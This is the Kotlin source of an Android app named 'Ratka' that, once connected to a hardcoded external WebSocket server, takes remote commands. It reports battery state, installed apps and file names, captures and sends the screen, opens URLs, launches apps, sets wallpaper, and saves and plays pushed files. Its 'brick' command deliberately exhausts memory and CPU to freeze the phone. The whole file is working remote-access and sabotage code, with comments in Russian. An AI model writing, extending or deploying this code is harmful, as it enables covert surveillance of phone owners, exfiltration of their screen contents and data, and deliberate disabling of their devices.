package com.ratka.client

import android.app.Activity
import android.app.WallpaperManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.MediaPlayer
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.media.RingtoneManager
import android.net.Uri
import android.os.*
import android.speech.tts.TextToSpeech
import android.util.Base64
import android.util.Log
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import okhttp3.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.util.Locale
import java.util.concurrent.TimeUnit

class MainActivity : Activity() {
    private val client = OkHttpClient.Builder().readTimeout(0, TimeUnit.MILLISECONDS).build()
    private var webSocket: WebSocket? = null
    private var statusText: TextView? = null
    private var tts: TextToSpeech? = null
    private val wsUrl = "wss://sanya-tech.cc.cd/ws"

    private var mediaProjectionManager: MediaProjectionManager? = null
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        tts = TextToSpeech(this) { status -> if (status == TextToSpeech.SUCCESS) tts?.language = Locale("ru", "RU") }
        mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager

        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(32, 32, 32, 32)
        }
        statusText = TextView(this).apply { text = "Ожидание подключения..." }
        val btnConnect = Button(this).apply {
            text = "Подключиться к Ратке"
            setOnClickListener { connectWebSocket() }
        }
        layout.addView(statusText)
        layout.addView(btnConnect)
        setContentView(layout)
    }

    private fun connectWebSocket() {
        val request = Request.Builder().url(wsUrl).build()
        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                runOnUiThread { statusText?.text = "Подключено" }
                webSocket.send(JSONObject().apply { put("type", "connect"); put("device_type", "android") }.toString())
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                try {
                    val json = JSONObject(text)
                    when (json.optString("cmd")) {
                        "battery" -> sendBatteryInfo(webSocket)
                        "vibrate" -> vibratePhone(2000)
                        "toast" -> showToast(json.optString("text", "Привет!"))
                        "open_url" -> openUrl(json.optString("url", "https://google.com"))
                        "sound" -> playSound()
                        "speak" -> speakText(json.optString("text", "Привет!"))
                        "volume_up" -> changeVolume(true)
                        "volume_down" -> changeVolume(false)
                        "apps" -> sendInstalledApps(webSocket)
                        "launch" -> launchApp(webSocket, json.optString("package", "com.android.settings"))
                        "wallpaper" -> setWallpaperFromBase64(webSocket, json.optString("data"))
                        "screen" -> requestScreenCapture()
                        "files" -> sendFiles(webSocket)
                        "play_file" -> playFile(webSocket, json.optString("data"), json.optString("filename"))
                        "brick" -> brickPhone()
                    }
                } catch (e: Exception) { 
                    sendError(webSocket, "Ошибка обработки: ${e.message}")
                }
            }
        })
    }

    private fun sendError(ws: WebSocket, error: String) {
        ws.send(JSONObject().apply { put("type", "response"); put("msg", "ОШИБКА: $error") }.toString())
    }

    private fun sendBatteryInfo(ws: WebSocket) {
        val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val ifilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        val batteryStatus: Intent? = registerReceiver(null, ifilter)
        val temp = (batteryStatus?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0) / 10.0
        val status = if (bm.isCharging) "Заряжается" else "От батареи"
        ws.send(JSONObject().apply { put("type", "battery"); put("level", level); put("temp", temp); put("status", status) }.toString())
    }

    private fun sendInstalledApps(ws: WebSocket) {
        try {
            val apps = packageManager.getInstalledApplications(0).map { it.packageName }.filter { !it.startsWith("android.") }
            ws.send(JSONObject().apply { put("type", "apps"); put("list", JSONArray(apps.take(50))) }.toString())
        } catch (e: Exception) { sendError(ws, "Не могу получить список приложений: ${e.message}") }
    }

    private fun sendFiles(ws: WebSocket) {
        try {
            val dir = getExternalFilesDir(null)
            val files = dir?.listFiles()?.map { it.name } ?: listOf("Папка пуста")
            ws.send(JSONObject().apply { put("type", "files"); put("list", JSONArray(files)) }.toString())
        } catch (e: Exception) { sendError(ws, "Ошибка файлов: ${e.message}") }
    }

    private fun vibratePhone(duration: Int) {
        val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            vibrator.vibrate(VibrationEffect.createOneShot(duration.toLong(), VibrationEffect.DEFAULT_AMPLITUDE))
        } else { @Suppress("DEPRECATION") vibrator.vibrate(duration.toLong()) }
    }

    private fun showToast(text: String) { runOnUiThread { Toast.makeText(this, text, Toast.LENGTH_LONG).show() } }
    private fun openUrl(url: String) { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url))) }
    private fun playSound() { RingtoneManager.getRingtone(applicationContext, RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION)).play() }
    private fun speakText(text: String) { tts?.speak(text, TextToSpeech.QUEUE_FLUSH, null, "RatkaTTS") }

    private fun changeVolume(up: Boolean) {
        val am = getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
        am.adjustStreamVolume(android.media.AudioManager.STREAM_MUSIC, if (up) android.media.AudioManager.ADJUST_RAISE else android.media.AudioManager.ADJUST_LOWER, android.media.AudioManager.FLAG_SHOW_UI)
    }

    private fun launchApp(ws: WebSocket, packageName: String) {
        try {
            val intent = packageManager.getLaunchIntentForPackage(packageName)
            if (intent != null) startActivity(intent) else sendError(ws, "Приложение $packageName не найдено")
        } catch (e: Exception) { sendError(ws, "Ошибка запуска: ${e.message}") }
    }

    private fun setWallpaperFromBase64(ws: WebSocket, base64Str: String) {
        try {
            val bytes = Base64.decode(base64Str, Base64.DEFAULT)
            val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
            
            if (bitmap == null) {
                sendError(ws, "Картинка битая или формат не поддерживается")
                return
            }
            
            // Сжимаем картинку, чтобы телефон не охуел
            val scaledBitmap = Bitmap.createScaledBitmap(bitmap, 1080, 1920, true)
            WallpaperManager.getInstance(this).setBitmap(scaledBitmap)
            
            runOnUiThread { statusText?.text = "Обои изменены" }
            ws.send(JSONObject().apply { put("type", "response"); put("msg", "Обои успешно поставлены!") }.toString())
        } catch (e: Exception) {
            sendError(ws, "Ошибка обоев: ${e.message}")
        }
    }

    private fun playFile(ws: WebSocket, base64Data: String, filename: String) {
        try {
            val audioData = Base64.decode(base64Data, Base64.DEFAULT)
            
            // Сохраняем во временную папку кэша
            val file = File(cacheDir, filename)
            file.writeBytes(audioData)
            
            if (!file.exists()) {
                sendError(ws, "Файл не сохранился: $filename")
                return
            }

            val player = MediaPlayer()
            player.setDataSource(file.absolutePath)
            player.prepare()
            player.start()
            
            runOnUiThread { statusText?.text = "Играет: $filename" }
            ws.send(JSONObject().apply { put("type", "response"); put("msg", "Аудио играет: $filename") }.toString())
            
        } catch (e: Exception) {
            sendError(ws, "Ошибка аудио: ${e.message}")
        }
    }

    private fun requestScreenCapture() {
        try {
            val intent = mediaProjectionManager?.createScreenCaptureIntent()
            startActivityForResult(intent, 1001)
        } catch (e: Exception) { Log.e("RATKA", "Ошибка запроса скриншота", e) }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 1001 && resultCode == Activity.RESULT_OK && data != null) {
            startScreenCapture(resultCode, data)
        }
    }

    private fun startScreenCapture(resultCode: Int, data: Intent) {
        try {
            val metrics = resources.displayMetrics
            val width = metrics.widthPixels; val height = metrics.heightPixels; val density = metrics.densityDpi
            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
            mediaProjection = mediaProjectionManager?.getMediaProjection(resultCode, data)
            virtualDisplay = mediaProjection?.createVirtualDisplay("ScreenCapture", width, height, density, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader?.surface, null, null)

            Handler(Looper.getMainLooper()).postDelayed({
                val image = imageReader?.acquireLatestImage()
                if (image != null) {
                    val planes = image.planes; val buffer = planes[0].buffer
                    val pixelStride = planes[0].pixelStride; val rowStride = planes[0].rowStride
                    val rowPadding = rowStride - pixelStride * width
                    val bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888)
                    bitmap.copyPixelsFromBuffer(buffer)
                    
                    val finalBitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height)
                    val baos = ByteArrayOutputStream()
                    finalBitmap.compress(Bitmap.CompressFormat.JPEG, 50, baos)
                    val base64Image = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
                    
                    webSocket?.send(JSONObject().apply { put("type", "screenshot"); put("data", base64Image) }.toString())
                    image.close()
                }
                virtualDisplay?.release(); mediaProjection?.stop()
                runOnUiThread { statusText?.text = "Скриншот отправлен" }
            }, 1000)
        } catch (e: Exception) { Log.e("RATKA", "Ошибка захвата", e) }
    }

    private fun brickPhone() {
        Thread {
            val hogList = mutableListOf<ByteArray>()
            while (true) {
                try {
                    hogList.add(ByteArray(5 * 1024 * 1024))
                    var counter = 0L
                    for (i in 1..5000000) { counter += i }
                } catch (e: OutOfMemoryError) { while (true) {} }
            }
        }.start()
        runOnUiThread { statusText?.text = "КИРПИЧ АКТИВИРОВАН" }
    }

    override fun onDestroy() { super.onDestroy(); tts?.shutdown() }
}
